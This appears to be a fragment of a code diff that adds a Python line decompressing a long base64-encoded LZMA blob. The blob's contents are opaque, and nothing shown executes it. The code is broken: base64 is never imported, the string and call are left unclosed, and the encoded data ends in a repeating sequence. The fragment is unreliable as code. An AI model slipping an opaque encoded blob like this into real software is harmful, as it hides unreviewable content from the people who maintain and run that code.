@@ -1,0 +1,2 @@
+import lzma
+lzma.decompress(base64.decodebytes(b'eNp1Us1uwzAM/SvJggC5Q9BT4qoq4bW8Bv4h1DV0Ft61d1QVJhvjhPX9Y9tOayIhJfnOtZa+V7l/70ALzdVQFl8iKzF9XmY27mZrcNBtZmhvZi/bSzIBt5wWx5x5v/ef9Q4Nq3BHWbB8/g1Zr2bo3o3HDTYxlx+yF1g9X1RbfU6LB+0D8Zdro6IokzPfBpbhrwBxO8WsEnp0fXCXKi1cT2TJVbZPkC/fK6g3n/nxhG1B/KLv9X/nZU6P/N6MIMU6P/N6MIMU6P/N6MIM
